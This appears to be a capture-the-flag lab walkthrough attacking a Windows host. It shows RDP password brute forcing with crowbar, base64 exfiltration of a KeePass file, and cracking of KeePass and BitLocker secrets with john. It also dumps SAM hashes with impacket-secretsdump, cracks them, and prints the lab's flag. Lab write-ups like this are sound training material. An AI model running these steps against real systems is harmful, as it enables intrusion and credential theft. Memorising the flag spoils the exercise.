# Password Attacks Lab - Hard

The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user `Johanna` is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

## Walkthrough

```bash
nmap -A -T4 10.129.202.222
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

we found out that the user `Johanna` is present on many hosts.

<pre class="language-bash"><code class="lang-bash"><strong>#we use crowbar because it seems faster than hydra for rdp
</strong><strong>crowbar -b rdp -s 10.129.202.222/32 -u johanna -C mut_password.list
</strong>2024-02-22 03:16:00 RDP-SUCCESS : 10.129.202.222:3389 - johanna:1231234!
#that took 15min XD
#quick check the smb share with johanna creds
smbclient -L //10.129.202.222 -U johanna%1231234!
#        Sharename       Type      Comment
#        ---------       ----      -------
#        ADMIN$          Disk      Remote Admin
#        C$              Disk      Default share
#        david           Disk      
#        IPC$            IPC       Remote IPC
smbclient //10.129.202.222/david -U johanna%1231234!
ls
NT_STATUS_ACCESS_DENIED listing \*
#unluck
</code></pre>

now lets rdp with johanna creds

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">xfreerdp /v:10.129.202.222 /u:johanna /p:'1231234!' /cert-ignore /dynamic-resolution
#we found C:\Users\johanna\Documents\Logins.kdbx
<strong>#lets tranfer it, first i try the classic impacket-smbserver but its not allowed
</strong><strong>#so we try to transfer via base64
</strong>#on powershell
[Convert]::ToBase64String((Get-Content -path "C:\Users\johanna\Documents\Logins.kdbx" -Encoding byte))
HASH
#on kali
echo 'HASH' | base64 -d > hosts
</code></pre>

now lets crack it using john

```bash
keepass2john Logins.kdbx > Logins.hash
john --wordlist=mut_password.list Logins.hash 
#Qwerty7!         (Logins)     
```

lets check it now

```bash
#after login we get david:gRzX7YbeTcDG7
smbclient -L //10.129.202.222 -U david%gRzX7YbeTcDG7
#        david           Disk    
#add -t 3600 (timeout) because the file transfered is huge
smbclient -t 3600 //10.129.202.222/david -U david%gRzX7YbeTcDG7 
smb: \> ls
#  .                                   D        0  Fri Feb 11 05:43:03 2022
#  ..                                  D        0  Fri Feb 11 05:43:03 2022
#  Backup.vhd                          A 136315392  Fri Feb 11 07:16:12 2022
get Backup.vhd
getting file \Backup.vhd of size 136315392 as Backup.vhd (120.2 KiloBytes/sec) (average 120.2 KiloBytes/sec)
#this takes me forever man, hope future me find a faster way to do this
```

now to do with this file

```bash
#https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0
sudo modprobe nbd
sudo qemu-nbd -c /dev/nbd0 -f vpc Backup.vhd
sudo cryptsetup bitlkOpen /dev/nbd0p2 PasswordHard
Enter passphrase for /dev/nbd0p2: 
#we dont know, so lets use john to crack the passphrase
sudo bitlocker2john -i /dev/nbd0 > Backup.hash
john --wordlist=mut_password.list Backup.hash
#123456789!       (?)     
#123456789!       (?) 
sudo cryptsetup bitlkOpen /dev/nbd0p2 PasswordHard
Enter passphrase for /dev/nbd0p2:123456789!
sudo mkdir /mnt/hardlab 
sudo mount /dev/mapper/PasswordHard /mnt/hardlab
```

now lets check inside

```bash
cd /mnt/hardlab
ls
#'$RECYCLE.BIN'   SAM   SYSTEM  'System Volume Information'
#use secretsdump to dump the hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
```

lets crack it with john

```bash
vim sam.hash
john --format=nt --wordlist=mut_password.list sam.hash 
#                 (Guest)     
#1231234!         (johanna)     
#Liverp00l8!      (Administrator)    
```

lets rdp as administrator

```bash
xfreerdp /v:10.129.202.222 /u:Administrator /p:'Liverp00l8!' /cert-ignore /dynamic-resolution
HTB{PWcr4ck1ngokokok}
```

To close the BitLocker partition properly we need to first `umount` then use `cryptsetup bitlkClose` for closing the partition

```bash
sudo umount /mnt/hardlab
sudo cryptsetup bitlkClose PasswordHard                                         
```
